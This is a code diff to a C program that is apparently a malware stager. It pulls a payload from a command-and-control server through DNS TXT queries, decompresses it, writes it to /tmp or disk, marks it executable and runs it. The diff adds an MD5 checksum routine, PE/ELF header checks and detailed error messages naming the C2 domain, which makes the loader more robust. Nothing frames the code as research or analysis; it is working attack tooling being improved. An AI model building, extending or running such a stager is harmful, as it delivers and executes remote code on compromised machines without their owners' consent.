@@ -80,6 +80,9 @@
 #define DNS_TIMEOUT 10
 #define MAX_DOMAINS 10
 
+// MD5 Constants
+#define MD5_DIGEST_SIZE 16
+
 // Retry configuration - can be overridden at build time
 #ifndef MAX_RETRIES
     #define MAX_RETRIES 5
@@ -334,6 +337,138 @@ static size_t base64_decode(const char *input, unsigned char *output, size_t out
     }
     
     return output_len;
+}
+
+/*
+ * Simple MD5 implementation for checksum verification
+ * Based on RFC 1321 - lightweight and sufficient for integrity checks
+ */
+#define MD5_F(x, y, z) (((x) & (y)) | ((~x) & (z)))
+#define MD5_G(x, y, z) (((x) & (z)) | ((y) & (~z)))
+#define MD5_H(x, y, z) ((x) ^ (y) ^ (z))
+#define MD5_I(x, y, z) ((y) ^ ((x) | (~z)))
+#define MD5_ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))
+
+static void md5_transform(uint32_t state[4], const unsigned char block[64]) {
+    uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
+    uint32_t x[16];
+    
+    // Decode block into 16 32-bit words
+    for (int i = 0, j = 0; i < 16; i++, j += 4) {
+        x[i] = ((uint32_t)block[j]) | (((uint32_t)block[j+1]) << 8) |
+               (((uint32_t)block[j+2]) << 16) | (((uint32_t)block[j+3]) << 24);
+    }
+    
+    // Round 1
+    static const uint32_t T1[16] = {
+        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
+        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
+        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
+        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821
+    };
+    static const int S1[16] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22};
+    for (int i = 0; i < 16; i++) {
+        uint32_t tmp = a + MD5_F(b, c, d) + x[i] + T1[i];
+        tmp = MD5_ROTATE_LEFT(tmp, S1[i]) + b;
+        a = d; d = c; c = b; b = tmp;
+    }
+    
+    // Round 2
+    static const uint32_t T2[16] = {
+        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
+        0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
+        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
+        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a
+    };
+    static const int S2[16] = {5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20};
+    static const int K2[16] = {1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12};
+    for (int i = 0; i < 16; i++) {
+        uint32_t tmp = a + MD5_G(b, c, d) + x[K2[i]] + T2[i];
+        tmp = MD5_ROTATE_LEFT(tmp, S2[i]) + b;
+        a = d; d = c; c = b; b = tmp;
+    }
+    
+    // Round 3
+    static const uint32_t T3[16] = {
+        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
+        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
+        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
+        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665
+    };
+    static const int S3[16] = {4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23};
+    static const int K3[16] = {5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2};
+    for (int i = 0; i < 16; i++) {
+        uint32_t tmp = a + MD5_H(b, c, d) + x[K3[i]] + T3[i];
+        tmp = MD5_ROTATE_LEFT(tmp, S3[i]) + b;
+        a = d; d = c; c = b; b = tmp;
+    }
+    
+    // Round 4
+    static const uint32_t T4[16] = {
+        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
+        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
+        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
+        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
+    };
+    static const int S4[16] = {6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};
+    static const int K4[16] = {0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9};
+    for (int i = 0; i < 16; i++) {
+        uint32_t tmp = a + MD5_I(b, c, d) + x[K4[i]] + T4[i];
+        tmp = MD5_ROTATE_LEFT(tmp, S4[i]) + b;
+        a = d; d = c; c = b; b = tmp;
+    }
+    
+    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
+}
+
+static void calculate_md5(const unsigned char *data, size_t len, unsigned char digest[MD5_DIGEST_SIZE]) {
+    uint32_t state[4] = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
+    unsigned char buffer[64];
+    size_t buffer_len = 0;
+    uint64_t total_bits = 0;
+    
+    // Process complete 64-byte blocks
+    while (len >= 64) {
+        md5_transform(state, data);
+        data += 64;
+        len -= 64;
+        total_bits += 512;
+    }
+    
+    // Save remaining bytes
+    if (len > 0) {
+        memcpy(buffer, data, len);
+        buffer_len = len;
+        total_bits += len * 8;
+    }
+    
+    // Padding: append 0x80 followed by zeros
+    buffer[buffer_len++] = 0x80;
+    
+    // If not enough room for length, process this block and start new one
+    if (buffer_len > 56) {
+        memset(buffer + buffer_len, 0, 64 - buffer_len);
+        md5_transform(state, buffer);
+        buffer_len = 0;
+    }
+    
+    // Pad with zeros up to 56 bytes
+    memset(buffer + buffer_len, 0, 56 - buffer_len);
+    
+    // Append length in bits (little-endian)
+    for (int i = 0; i < 8; i++) {
+        buffer[56 + i] = (total_bits >> (i * 8)) & 0xff;
+    }
+    
+    md5_transform(state, buffer);
+    
+    // Output digest (little-endian)
+    for (int i = 0; i < 4; i++) {
+        digest[i*4]     = (state[i] >> 0) & 0xff;
+        digest[i*4 + 1] = (state[i] >> 8) & 0xff;
+        digest[i*4 + 2] = (state[i] >> 16) & 0xff;
+        digest[i*4 + 3] = (state[i] >> 24) & 0xff;
+    }
 }
 
 /*
@@ -687,7 +822,16 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     
     if (recv_len <= 0) {
         DIAG_PRINT("[DIAG] Failed to receive response (recv_len=%d)\n", recv_len);
-        DEBUG_PRINT("[!] Failed to receive response (recv_len=%d)\n", recv_len);
+        DEBUG_PRINT("[!] ERROR: Failed to receive DNS response (recv_len=%d)\n", recv_len);
+        if (recv_len == 0) {
+            DEBUG_PRINT("[!] Connection closed by server or timeout\n");
+        } else {
+#ifdef _WIN32
+            DEBUG_PRINT("[!] Socket error code: %d\n", WSAGetLastError());
+#else
+            DEBUG_PRINT("[!] Socket error: %s (errno: %d)\n", strerror(errno), errno);
+#endif
+        }
         return -1;
     }
     
@@ -696,7 +840,9 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     if (recv_len < sizeof(dns_header_t)) {
         DIAG_PRINT("[DIAG] Response too short: %d bytes (need at least %zu)\n", 
                 recv_len, sizeof(dns_header_t));
-        DEBUG_PRINT("[!] Response too short: %d bytes\n", recv_len);
+        DEBUG_PRINT("[!] ERROR: DNS response too short: %d bytes (expected at least %zu)\n", 
+                   recv_len, sizeof(dns_header_t));
+        DEBUG_PRINT("[!] Likely malformed DNS packet or network corruption\n");
         return -1;
     }    // Parse response header
     dns_header_t *resp_header = (dns_header_t *)answer;
@@ -707,7 +853,11 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     
     if (ancount == 0) {
         DIAG_PRINT("[DIAG] No answers in DNS response\n");
-        DEBUG_PRINT("[!] No answers in DNS response\n");
+        DEBUG_PRINT("[!] ERROR: No TXT records in DNS response\n");
+        DEBUG_PRINT("[!] This could mean:\n");
+        DEBUG_PRINT("[!]   - Domain not configured on C2 server\n");
+        DEBUG_PRINT("[!]   - DNS query reached wrong server\n");
+        DEBUG_PRINT("[!]   - Server not returning TXT records\n");
         return -1;
     }
     
@@ -758,6 +908,8 @@ static int dns_query_txt(const char *domain, char *response, size_t response_siz
     }
     
     DIAG_PRINT("[DIAG] No valid TXT record found in response\n");
+    DEBUG_PRINT("[!] ERROR: No valid TXT records found in DNS response\n");
+    DEBUG_PRINT("[!] Received %d answer(s) but none were TXT records (type 16)\n", ancount);
     return -1;
 }
 
@@ -882,12 +1034,21 @@ static int send_dns_message(const char *message, const char *target_domain, char
         
         // Wait before retrying (except on last attempt)
         if (attempt < MAX_RETRIES - 1) {
-    DEBUG_PRINT("[*] Waiting %d seconds before retry...\n", RETRY_DELAY_SECONDS);
+            DEBUG_PRINT("[*] Waiting %d seconds before retry...\n", RETRY_DELAY_SECONDS);
 #ifdef _WIN32
             Sleep(RETRY_DELAY_SECONDS * 1000);
 #else
             sleep(RETRY_DELAY_SECONDS);
 #endif
+        } else {
+            // Final attempt failed - provide detailed error
+            DEBUG_PRINT("[!] ERROR: All %d DNS query attempts failed for domain: %s\n", 
+                       MAX_RETRIES, target_domain);
+            DEBUG_PRINT("[!] Possible causes:\n");
+            DEBUG_PRINT("[!]   - DNS server unreachable (%s:%d)\n", DNS_SERVER, DNS_PORT);
+            DEBUG_PRINT("[!]   - C2 domain not responding: %s\n", target_domain);
+            DEBUG_PRINT("[!]   - Network filtering/firewall blocking DNS\n");
+            DEBUG_PRINT("[!]   - Server-side issue (check server logs)\n");
         }
     }
     
@@ -1248,11 +1409,54 @@ int main(int argc, char *argv[]) {
     free(compressed);
     
     if (client_size == 0) {
-    DEBUG_PRINT("[!] Decompression failed\n");
+        DEBUG_PRINT("[!] ERROR: Decompression failed - invalid or corrupted compressed data\n");
         goto cleanup;
     }
     
     DEBUG_PRINT("[*] Client binary size: %zu bytes\n", client_size);
+    
+    // Calculate MD5 checksum for integrity verification
+    unsigned char md5_digest[MD5_DIGEST_SIZE];
+    calculate_md5(client_binary, client_size, md5_digest);
+    
+    DEBUG_PRINT("[*] Client MD5: ");
+    for (int i = 0; i < MD5_DIGEST_SIZE; i++) {
+        DEBUG_PRINT("%02x", md5_digest[i]);
+    }
+    DEBUG_PRINT("\n");
+    
+    // Basic sanity checks on binary
+    if (client_size < 100) {
+        DEBUG_PRINT("[!] ERROR: Client binary too small (%zu bytes) - likely corrupted\n", client_size);
+        free(client_binary);
+        goto cleanup;
+    }
+    
+    // Check for common executable magic bytes
+    int is_valid_binary = 0;
+#ifdef _WIN32
+    // Windows PE: "MZ" header
+    if (client_size >= 2 && client_binary[0] == 'M' && client_binary[1] == 'Z') {
+        is_valid_binary = 1;
+    }
+#else
+    // Linux ELF: 0x7F 'E' 'L' 'F'
+    if (client_size >= 4 && client_binary[0] == 0x7F && 
+        client_binary[1] == 'E' && client_binary[2] == 'L' && client_binary[3] == 'F') {
+        is_valid_binary = 1;
+    }
+#endif
+    
+    if (!is_valid_binary) {
+        DEBUG_PRINT("[!] ERROR: Binary verification failed - invalid executable format\n");
+        DEBUG_PRINT("[!] First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                   client_binary[0], client_binary[1], client_binary[2], client_binary[3],
+                   client_binary[4], client_binary[5], client_binary[6], client_binary[7]);
+        free(client_binary);
+        goto cleanup;
+    }
+    
+    DEBUG_PRINT("[*] Binary format verified successfully\n");
     
     // Write client to disk (use /tmp on Linux for write permissions)
 #ifdef _WIN32
@@ -1265,7 +1469,8 @@ int main(int argc, char *argv[]) {
     
     FILE *fp = fopen(client_filename, "wb");
     if (!fp) {
-    DEBUG_PRINT("[!] Failed to open file for writing (errno: %d)\n", errno);
+        DEBUG_PRINT("[!] ERROR: Failed to open file for writing: %s (errno: %d)\n", 
+                   client_filename, errno);
         free(client_binary);
         goto cleanup;
     }
@@ -1276,13 +1481,18 @@ int main(int argc, char *argv[]) {
     
 #ifndef _WIN32
     // Make the client executable on Linux
-    chmod(client_filename, 0755);
+    if (chmod(client_filename, 0755) != 0) {
+        DEBUG_PRINT("[!] WARNING: Failed to set executable permissions (errno: %d)\n", errno);
+    }
 #endif
     
     DEBUG_PRINT("[*] Executing client...\n");
     
     // Execute client
-    execute_client(client_filename);
+    if (execute_client(client_filename) != 0) {
+        DEBUG_PRINT("[!] ERROR: Failed to execute client binary\n");
+        goto cleanup;
+    }
     
     DEBUG_PRINT("[+] Stager complete!\n");
     
